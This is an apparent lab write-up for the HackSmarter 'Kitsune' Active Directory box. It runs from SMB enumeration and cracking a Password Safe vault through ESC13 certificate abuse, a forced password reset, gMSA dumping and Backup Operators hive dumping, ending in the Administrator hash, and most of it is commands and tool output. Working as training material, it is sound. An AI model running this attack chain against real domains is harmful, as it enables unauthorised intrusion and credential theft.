---
title: "Kitsune — Active Directory Lab (HackSmarter)"
description: "An Easy-rated Active Directory lab walkthrough covering enumeration, Password Safe, BloodHound, AD CS ESC13, gMSA abuse, and Administrator access."
pubDate: 2026-11-06
category: "Active Directory"
difficulty: "Easy"

---

![laboverview.png](/images/kitsune/laboverview.png)

# Enumeration

## Nmap

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ nmap -sC -sV 10.1.46.178                 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 11:36 -0400
Nmap scan report for 10.1.46.178
Host is up (0.30s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-22 15:36:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Not valid before: 2026-10-12T21:14:40
|_Not valid after:  2027-10-12T21:14:40
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Not valid before: 2026-10-11T08:21:43
|_Not valid after:  2027-04-12T08:21:43
| rdp-ntlm-info: 
|   Target_Name: KITSUNE
|   NetBIOS_Domain_Name: KITSUNE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: kitsune.local
|   DNS_Computer_Name: DC01.kitsune.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-10-22T15:37:42+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=10/22%Time=6ADA2D9C%P=x86_64-pc-linux-gnu%r(
SF:TerminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x0
SF:2\0\0\0");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-22T15:37:43
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.82 seconds

```

### What Ports Tells Us

| Finding | What it tells you |
| --- | --- |
| `53/tcp` — DNS | Likely Active Directory DNS |
| `88/tcp` — Kerberos | Strong evidence of an AD domain controller |
| `389/tcp` — LDAP | Active Directory directory service |
| `636/tcp` — LDAPS | LDAP over TLS; certificate information is available |
| `3268/tcp`, `3269/tcp` — Global Catalog | Additional AD directory services, including TLS on 3269 |
| `445/tcp` — SMB | Useful for domain and share enumeration |
| `5985/tcp` — HTTPAPI | WinRM commonly uses this port; authentication and access still need investigation |
| `3389/tcp` — RDP | Remote Desktop; Nmap reveals the domain and hostname |

## SMB(445) Enumeration

**Enumerating Null Sessions Using NetExec** Got `STATUS_ACCESS_DENIED`

You Can Read more about `NetExec` @[https://www.netexec.wiki/](https://www.netexec.wiki/) 

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ nxc smb kitsune.local -u '' -p '' --shares
SMB         10.1.46.178     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.46.178     445    DC01             [+] kitsune.local\: 
SMB         10.1.46.178     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
    
```

Using `SMBClient` we are able to List Shares , `Files` seems an Interesting Share to enumerate further.

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ smbclient -L //10.1.46.178/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Files           Disk      Global file share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.1.46.178 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                      
```

Accessing `Files` Share

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ smbclient  //10.1.46.178/Files -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 13 00:08:20 2026
  ..                                DHS        0  Thu Oct 15 06:49:47 2026
  10-11-Calendar_October.pdf          A     3190  Mon Oct 12 22:23:43 2026
  10-11-Financial_Report.pdf          A     4076  Mon Oct 12 22:23:49 2026
  10-11-Timesheet.pdf                 A     3854  Mon Oct 12 22:21:23 2026
  logins.psafe3                       A      840  Mon Oct 12 21:59:03 2026

                12974591 blocks of size 4096. 3513768 blocks available

```

Downloading All Files inside the Share

```text
smb: \> mget *
Get file 10-11-Calendar_October.pdf? yes
getting file \10-11-Calendar_October.pdf of size 3190 as 10-11-Calendar_October.pdf (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
Get file 10-11-Financial_Report.pdf? yes
getting file \10-11-Financial_Report.pdf of size 4076 as 10-11-Financial_Report.pdf (3.4 KiloBytes/sec) (average 3.0 KiloBytes/sec)
Get file 10-11-Timesheet.pdf? yes
getting file \10-11-Timesheet.pdf of size 3854 as 10-11-Timesheet.pdf (3.2 KiloBytes/sec) (average 3.1 KiloBytes/sec)
Get file logins.psafe3? yes
getting file \logins.psafe3 of size 840 as logins.psafe3 (0.6 KiloBytes/sec) (average 2.4 KiloBytes/sec)
```

Some Possible Usernames in Timesheet Pdf

![Screenshot_2026-10-22_12-04-42.png](/images/kitsune/Screenshot_2026-10-22_12-04-42.png)

## Working with `.psafe3` File

 `logins.psafe3` file

<aside>
💡

A **`.psafe3`** file is an encrypted database created by [**Password Safe**](https://pwsafe.org/), a free, open-source password manager.The file `logins.psafe3` is a password vault. It contains a collection of encrypted usernames, passwords, URLs, and notes. In penetration testing and Hack The Box labs, administrators or employees sometimes leave these vaults in shared folders, backups, or user directories.

</aside>

**How to Attack a `.psafe3` Vault**

**Step 1: Extract the Hash**

You can use `john`'s built-in tool, `pwsafe2john`, to extract the crackable hash from the database. Run the following in your terminal: 

```
pwsafe2john logins.psafe3 > vault_hash.txt
```

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ pwsafe2john logins.psafe3 > vault_hash.txt
                                                                                                                                       
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ ls
10-11-Calendar_October.pdf  10-11-Financial_Report.pdf  10-11-Timesheet.pdf  challenge_lab_kitsun.ovpn  logins.psafe3  vault_hash.txt

```

**Step 2: Crack the Master Password Once you have the hash, you can crack it using a wordlist like `rockyou.txt` using `John the Ripper`**

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt vault_hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 327680 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hellokitty       (login)     
1g 0:00:00:27 DONE (2026-10-22 12:49) 0.03589g/s 110.2p/s 110.2c/s 110.2C/s 123456..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We have the Password for Opening `login.psafe3` File as `hellokitty`. We need to have `pwsafe` installed in our Kali to view the `login.psafe3` file.

To Install `pwsafe` in Kali : `sudo apt install pwsafe`

Opening the `login.psafe3` File

![pwssafe.png](/images/kitsune/pwssafe.png)

![Screenshot_2026-10-22_12-57-15.png](/images/kitsune/Screenshot_2026-10-22_12-57-15.png)

We can Right Click on Each and get the Passwords Copied , Credentials Obtained from `login.pwsafe3`

```text
admin : I#zmE{z[n3HM   
ranch : R@nch2026!  
root : a%KlRhqbuRgL  
```

## Bloodhound loot with our user  `ranch`  user ranch can set password for `schlop`

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ sudo apt install bloodhound.py -y
bloodhound-python -u 'ranch' -p 'R@nch2026!' -d kitsune.local -ns 10.1.46.178 -c All

```

## Finding Vulnerable Certificates with user `ranch`

The reasoning to remember to look for Certificates : AD domain controller + LDAP/LDAPS + Microsoft-specific certificate SAN entry.

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ certipy-ad find -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.46.178 -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'kitsune-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'kitsune-DC01-CA'
[*] Checking web enrollment for CA 'kitsune-DC01-CA' @ 'DC01.kitsune.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : kitsune-DC01-CA
    DNS Name                            : DC01.kitsune.local
    Certificate Subject                 : CN=kitsune-DC01-CA, DC=kitsune, DC=local
    Certificate Serial Number           : 23E87814E94E648848405CFD9514BD14
    Certificate Validity Start          : 2026-10-12 21:14:31+00:00
    Certificate Validity End            : 2125-10-12 21:24:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : KITSUNE.LOCAL\Administrators
      Access Rights
        ManageCa                        : KITSUNE.LOCAL\Administrators
                                          KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        ManageCertificates              : KITSUNE.LOCAL\Administrators
                                          KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Enroll                          : KITSUNE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Kitsune-User
    Display Name                        : Kitsune-User
    Certificate Authorities             : kitsune-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2026-10-12T22:12:00+00:00
    Template Last Modified              : 2026-10-13T00:52:56+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307.14988779.16010669.3757508.10421200.134.6077557.15214621
    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
    Permissions
      Enrollment Permissions
        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : KITSUNE.LOCAL\Administrator
        Full Control Principals         : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Owner Principals          : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Dacl Principals           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Property Enroll           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.

```

the `Kitsune-User` template is vulnerable to ESC13 as its description says `Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.`

## ESC13

<aside>
💡

Imagine a corporate building where everyone uses **ID badges** to get through doors. **ESC13** is like **a security flaw that allows a regular employee to trick the system into printing a badge that falsely grants them executive-level access**.

</aside>

**💡 The Analogy: The "VIP Room" Flaw**

1. **The Rule:** The building management sets up a rule: *"Anyone who presents a specific 'Project Alpha' badge automatically gets access to the executive VIP lounge."*
2. **The Flaw:** They forget to restrict who can request a "Project Alpha" badge.
3. **The Trick:** A regular receptionist goes to the badge-printing kiosk and requests a "Project Alpha" badge. The automated machine sees no restriction, prints it, and hands it over.
4. **The Breach:** The receptionist swipes the new badge at the VIP door. The door system checks the badge, sees "Project Alpha," assumes the user is an executive, and unlocks the door.

**🔍 How it Translates to Computers**

In Microsoft networks (specifically **Active Directory Certificate Services**), companies use digital certificates (the "badges") to log into systems without typing a password.

- **The Setup:** A network administrator links a digital certificate template to a powerful group (like Domain Administrators). They intend for this to give legitimate users a seamless login experience.
- **The Mistake:** The administrator leaves the enrollment settings open, meaning **any standard user** on the network can ask the system for that specific type of certificate.
- **The Attack:** A hacker (or an insider) asks the system for one of these certificates. The system generates it. When the hacker logs in using that certificate, the network automatically treats them as a powerful administrator, giving them full control over the company's network.

**🛡️ The Bottom Line**

ESC13 isn't a broken piece of software or a virus; it is a **hidden settings mistake** where the system automatically trusts a certificate to grant high-level permissions without double-checking if the person requesting it actually belongs in that powerful group.

## **Active Directory Certificate Services (AD CS) ESC13** abuse to escalate privileges or compromise another user's  `schlop` account.

### Requesting a Certificate

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ certipy-ad req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.46.178 -template 'Kitsune-User' -ca 'kitsune-DC01-CA' -key-size 4096

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 27
[*] Successfully requested certificate
[*] Got certificate with UPN 'ranch@kitsune.local'
[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Saving certificate and private key to 'ranch.pfx'
[*] Wrote certificate and private key to 'ranch.pfx'
                                                      
                                                      
                                                      
                                                      
                                                      
                                                      
```

### Authenticating via Kerberos (PKINIT)

```text
certipy-ad auth -pfx ranch.pfx -dc-ip 10.1.46.178

┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ certipy-ad auth -pfx ranch.pfx -dc-ip 10.1.46.178

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ranch@kitsune.local'
[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Using principal: 'ranch@kitsune.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ranch.ccache'
[*] Wrote credential cache to 'ranch.ccache'
[*] Trying to retrieve NT hash for 'ranch'
[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1

```

### Setting the Kerberos Environment Variable

```text
export KRB5CCNAME=ranch.ccache

```

### Forcing a Password Reset on `schlop` User as per the description found above for ESC13

```text
the Kitsune-User template is vulnerable to ESC13 as its description says Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.
```

![bloodhound.png](/images/kitsune/bloodhound.png)

```text
/usr/bin/bloodyad -k -d kitsune.local --host DC01.kitsune.local set password schlop 'Hacksmart123!'

[+] Password changed successfully!
```

T**he Bloodhound show that user `schlop` is member of Remote Management , lets test its credentials that we just forced above.**

![userschlop.png](/images/kitsune/userschlop.png)

## Validating `SCHLOP` Remote Desktop access ,and we got the Pwn3d! 😃

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ nxc winrm kitsune.local -u 'schlop' -p 'Hacksmart123!'
WINRM       10.1.46.178     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) 
WINRM       10.1.46.178     5985   DC01             [+] kitsune.local\schlop:Hacksmart123! (Pwn3d!)
```

### Winrm Into `schlop's` account and we got our `user` flag.. 😄

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ evil-winrm -i 10.1.46.178 -u 'schlop' -p 'Hacksmart123!'              

                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\schlop\Documents> dir

    Directory: C:\Users\schlop\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:37 AM           1770 networkAuth.cred

*Evil-WinRM* PS C:\Users\schlop\Documents> cd ..
*Evil-WinRM* PS C:\Users\schlop> dir

    Directory: C:\Users\schlop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          4/1/2025   6:24 PM                Contacts
d-r---        10/13/2026   2:33 AM                Desktop
d-r---        10/13/2026   2:37 AM                Documents
d-r---          4/1/2025   6:24 PM                Downloads
d-r---          4/1/2025   6:24 PM                Favorites
d-r---          4/1/2025   6:24 PM                Links
d-r---          4/1/2025   6:24 PM                Music
d-r---          4/1/2025   6:24 PM                Pictures
d-r---          4/1/2025   6:24 PM                Saved Games
d-r---          4/1/2025   6:24 PM                Searches
d-r---          4/1/2025   6:24 PM                Videos

*Evil-WinRM* PS C:\Users\schlop> cd Desktop
*Evil-WinRM* PS C:\Users\schlop\Desktop> dir

    Directory: C:\Users\schlop\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:33 AM            344 user.txt

*Evil-WinRM* PS C:\Users\schlop\Desktop> cat user.txt
  ,-.       _,---._ __  / \
 /  )    .-'       `./ /   \
(  (   ,'            `/    /|
 \  `-"             \'\   / |
  `.              ,  \ \ /  |
   /`.          ,'-`----Y   |
  (            ;        |   '
  |  ,-.    ,-'         |  /
  |  | (   |       yay! | /
  )  |  \  `.___________|/
  `--'   `--'

```

### navigating `schlops` directories found `networkAuth.cred` file that’s a **PowerShell PSCredential object**

```text
*Evil-WinRM* PS C:\Users\schlop\Documents> ls

    Directory: C:\Users\schlop\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:37 AM           1770 networkAuth.cred

*Evil-WinRM* PS C:\Users\schlop\Documents> 

```

### Decrypting the PSCredential file

**you can decrypt this directly within your current Evil-WinRM session** as long as you are running under the same user contexts that has access to it.

Run the following commands in your Evil-WinRM session to decrypt the password and reveal it in plaintext:

**🔑 Decryption Commands**

```text
*Evil-WinRM* PS C:\Users\schlop\Documents> $credential = Import-Clixml -Path C:\Users\schlop\Documents\networkAuth.cred
$credential.GetNetworkCredential().Password
PebbleIs47!
*Evil-WinRM* PS C:\Users\schlop\Documents> 

```

#### Creds Found for `Pebble` User

```text
Pebble : PebbleIs47!
```

**BloodHound mapping for `Pebble`**

![pebble.png](/images/kitsune/pebble.png)

## Dumping GMSA as `Pebble` User

[gMSADumper_mod.py](/downloads/kitsune/gMSADumper_mod.py)

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ ./gMSADumper_mod.py -u 'pebble' -p 'PebbleIs47!' -d 'kitsune.local' -l 10.1.46.178

Users or groups who can read password for svc_gmsa$:
 > IT
svc_gmsa$:::085691c182d60ab1a12466ce7b50d29d
svc_gmsa$:aes256-cts-hmac-sha1-96:4da9193a94b52900dd5019a3757329a7ef9c51418f88ff2cf15db7433298ab7d
svc_gmsa$:aes128-cts-hmac-sha1-96:5ec42299b69abce69a96b1795f7d10c0
                                                                    
```

## Collecting bloodhound loot as `svc_gmsa$` service account to map further

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ bloodhound-python -u 'svc_gmsa$' --hashes :085691c182d60ab1a12466ce7b50d29d -d kitsune.local -ns 10.1.46.178 --auth-method ntlm --use-ldaps -c DCOnly

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: kitsune.local
INFO: Connecting to LDAP server: dc01.kitsune.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Connecting to LDAP server: dc01.kitsune.local
INFO: Found 10 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 1 computers
INFO: Found 0 trusts
INFO: Done in 01M 02S

```

![svcdetails.png](/images/kitsune/svcdetails.png)

#### As we can see `SVC_GMSA$` is Member of `BACKUP Operators` and we have a `netexec` module for it

<aside>
💡

NetExec includes a dedicated **backup_operator** module that automates the entire registry backup and hash dumping flow in a single command. It uses Backup Operators membership to remotely save the SAM, SYSTEM, and SECURITY hives to SYSVOL and retrieves them automatically.

</aside>

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ nxc smb kitsune.local -u 'svc_gmsa$' -H '085691c182d60ab1a12466ce7b50d29d' -M backup_operator 
SMB         10.1.46.178     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.46.178     445    DC01             [+] kitsune.local\svc_gmsa$:085691c182d60ab1a12466ce7b50d29d 
BACKUP_O... 10.1.46.178     445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.1.46.178     445    DC01             Saved HKLM\SAM to \\10.1.46.178\SYSVOL\SAM
BACKUP_O... 10.1.46.178     445    DC01             Saved HKLM\SYSTEM to \\10.1.46.178\SYSVOL\SYSTEM
BACKUP_O... 10.1.46.178     445    DC01             Saved HKLM\SECURITY to \\10.1.46.178\SYSVOL\SECURITY
SMB         10.1.46.178     445    DC01             [*] Copying "SAM" to "/home/kali/.nxc/logs/DC01_10.1.46.178_2026-10-29_114228.SAM"
SMB         10.1.46.178     445    DC01             [+] File "SAM" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.46.178_2026-10-29_114228.SAM"
SMB         10.1.46.178     445    DC01             [*] Copying "SECURITY" to "/home/kali/.nxc/logs/DC01_10.1.46.178_2026-10-29_114228.SECURITY"
SMB         10.1.46.178     445    DC01             [+] File "SECURITY" was downloaded to "/home/kali/.nxc/logs/DC01_10.1.46.178_2026-10-29_114228.SECURITY"
SMB         10.1.46.178     445    DC01             [*] Copying "SYSTEM" to "/home/kali/.nxc/logs/DC01_10.1.46.178_2026-10-29_114228.SYSTEM"
SMB         10.1.46.178     445    DC01             [-] Error writing file "SYSTEM" from share "SYSVOL": ("Unpacked data doesn't match constant value 'b' \\xfd\\x0b\\xd8'' should be ''þSMB''", 'When unpacking field \'ProtocolID | "þSMB | b\' \\xfd\\x0b\\xd8Ss#\\xdc\\xc8\\xee3+\\x07\\xec1\\xb6\\xf6+\\xeeSb\\\\\\x1a\\\'3\\xed\\xd3\\x10\\x97b2\\xf1\\xf9\\xac\\xb8\\x03s\\x7f<\\xb8n\\xbfXE\\xb8P]\\xb9\\x05GU\\xc0\\xcc\\xa3\\x8b\\xf3;\\x0c\\xd6\\xc3\\xffi\\x1e\\xb2\\\\b\\xf0\\xe4\\xc8p\\x1e\\x90;k\
7^2\\x1d\\xb5\\xd5e\\xe3n\\x0bzmh\\x08\\x9a\\xe9\\x15W\\xe3p\\xf3\\xb8\\x04\\x0f$\\xe4\\xb8\\xc0\\x07\\xde\\xc7\\xdcu]z\\xfd\'[:4]\'')
BACKUP_O... 10.1.46.178     445    DC01             [-] Fail to dump the sam and lsa: [Errno 2] No such file or directory: '/home/kali/.nxc/logs/DC01_10.1.46.178_2026-10-29_114228.SYSTEM'
BACKUP_O... 10.1.46.178     445    DC01             [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 10.1.46.178     445    DC01             [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"
                                                                
```

#### some troubleshooting

**NetExec successfully triggered the registry dump on the target**, but failed during the download phase of the `SYSTEM` hive due to an Impacket SMB packet parsing error (often triggered by SMB dialect quirks, large file chunking, or encryption on modern targets like Server 2025).

Because the `backup_operator` module successfully saved `SYSTEM` to the remote `SYSVOL` share before crashing, you do not need to re-run the registry dump. You can **manually download the remaining SYSTEM hive** using `smbclient` or another tool.

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ impacket-smbclient 'kitsune.local/svc_gmsa$:@10.1.125.232' -hashes :085691c182d60ab1a12466ce7b50d29d

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 reconnect - reconnect connection, useful for broken pipes & interrupted sessions
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 rget {mask} - recursively downloads all files from the current directory and subdirectories matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 acl {filename,action,permissions,user/group} - displays or modifies file ACLs
 close - closes the current SMB Session
 exit - terminates the server process (and this session)

# use SYSVOL
# get SYSTEM
# LS
*** Unknown syntax: LS
# ls
drw-rw-rw-          0  Thu Oct 29 20:41:50 2026 .
drw-rw-rw-          0  Mon Oct 12 04:21:04 2026 ..
drw-rw-rw-          0  Mon Oct 12 04:21:04 2026 kitsune.local
-rw-rw-rw-      28672  Thu Oct 29 20:41:45 2026 SAM
-rw-rw-rw-      36864  Thu Oct 29 20:41:50 2026 SECURITY
-rw-rw-rw-   19513344  Thu Oct 29 20:41:48 2026 SYSTEM

```

### Dumping the `Administrator`hash

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ impacket-secretsdump -sam /home/kali/.nxc/logs/*204133.SAM -security /home/kali/.nxc/logs/*204133.SECURITY -system SYSTEM LOCAL

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3b61a7e10112dd9303cba2228589d145
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
